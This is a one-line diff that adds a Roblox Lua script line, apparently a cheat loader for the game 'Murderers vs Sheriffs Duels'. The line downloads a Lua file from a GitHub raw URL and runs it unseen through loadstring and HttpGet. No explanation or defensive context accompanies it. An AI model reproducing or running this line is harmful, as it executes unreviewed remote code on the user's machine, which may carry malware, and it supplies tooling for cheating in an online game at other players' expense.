@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/mvsd-murderers-vs-sheriffs-duels-spam2-5573wxh0g0gfa1.lua"))()
